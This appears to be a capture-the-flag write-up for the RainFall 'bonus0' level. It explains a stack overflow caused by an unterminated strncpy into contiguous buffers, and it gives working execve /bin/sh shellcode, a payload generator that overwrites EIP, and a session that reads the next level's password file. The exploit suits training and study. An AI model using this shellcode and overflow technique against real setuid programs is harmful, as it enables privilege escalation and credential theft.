# Bonus0

## Solution

* There is one file in our home, ```bonus0```, belonging to ```bonus1``` user, with suid.
* Here's the hand-decompiled source code we propose for this binary: [source.c](source.c)

* For the sake of clarity, we won't display the very long disassembled code, but we will describe its behaviour:

	* main function allocates on its stack a ```0x2a``` bytes buffer (that we will name ```final_buf```) and passes it to ```pp``` function
	* ```pp``` function allocates two ```0x14 = 20``` bytes buffers on its stack (```buf1``` and ```buf2```). It is important to note that ```buf2``` and ```buf1``` are contiguous
	* ```p``` function is called twice by ```pp```, with successively ```buf2``` and ```buf1``` as parameter
	* ```p``` reads on the stdin with a limit of ```0x1000 = 4096``` bytes
	* ```p``` uses ```strchr``` to find the first occurrence of ```\n``` and puts ```\0``` instead. This section is not protected, so we need to have a `\n` in the read data.
	* it then uses ```strncpy``` to copy the content of what has been read in the buffer passed in argument, with a limit of ```0x14``` chars
	* the content of ```buf2``` is then copied in ```final_buf```
	* a space is put in place of final ```\0``` and ```strcat``` is used to concatenate the string with the content of ```buf1```
	* ```main``` finally prints the final_buf

* What we did with all of that:

	* our goal was to use the ```final_buf``` to write an address of a shellcode in place of the former ```eip``` address
	* the offset between the beginning of ```final_buf``` and the location of former ```eip``` address is ```0x36 = 54``` bytes : it means that we wanted to write the address of our shellcode ```54``` bytes after the beginning of ```final_buf```
		* To get this offset we can use a neat tool from gdp-peda : `pattern`
		* First, create a pattern of the desired length, 19 here : ```pattern create 19``` we will get this nice string in return : `'AAA%AAsAABAA$AAnAAC'`.
		* Now lets run in gdb:
			* First read can receive only random characters (but more than 19)
			* For the second read we must paste our patter, and continue execution
		* Once the program has SegFault, we do `pattern search` and we see a match in `EIP` at `pattern offset 14`, we now now where to put the new `EIP`.
		* So, we have this layout :
			1. [20:                  1st read]
			2. [19                   2nd read]
			3. [1:                      space]
			4. [14: starting char of 2nd read]
			5. [4:                    New EIP]
	* in theory we could only write ```40``` bytes at the end as only ```20``` bytes are copied in respectively ```buf2``` and ```buf1``` after call to ```read```
	* but ```buf2``` and ```buf1``` are contiguous in memory and the content of call to ```read``` is copied with ```strncpy```: if there is no ```\0``` in the first ```20``` bytes, the copy won't be terminated
	* for instance, if ```buf1``` is not terminated, ```final_buf``` will be as follow: ```buf1+buf2 buf2```, that is to say potentially ```59``` bytes
	* we decided to store the shell code in an environment variable:
	```sh
	export SHELLCODE=`python -c "print('\x90' * 1024 + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x53\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xcd\x80')"`
	```
	* the we got the ```SHELLCODE``` variable approximative address thanks to ```env.c``` program (see in the ressources)
	```
	bonus0@RainFall:~$ gcc -fno-stack-protector -z execstack -o /var/crash/env /var/crash/env.c
	bonus0@RainFall:~$ /var/crash/env SHELLCODE
	SHELLCODE: 0xbffff4ce
	```
	* to be able to handle the two successive calls to ```read``` with only one file, we wrote first ```0x1000 = 4096``` bytes in a file (the size of the ```read``` buffer), followed by padding bytes and finally the approximative address of our shellcode:
	```sh
	python -c "print('A' * 4095 + '\n' + 'B' * 14 + 'def4ffbf'.decode('hex') + 'C' + '\n')" > /var/crash/bns0
	```
	* we can now exploit the vulnerability of ```bonus0``` file:
	```
	bonus0@RainFall:~$ cat /var/crash/bns0 - | ./bonus0
	-
	-
	AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBB����C BBBBBBBBBBBBBB����C
	cd ../bonus1; cat .pass
	cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
	```
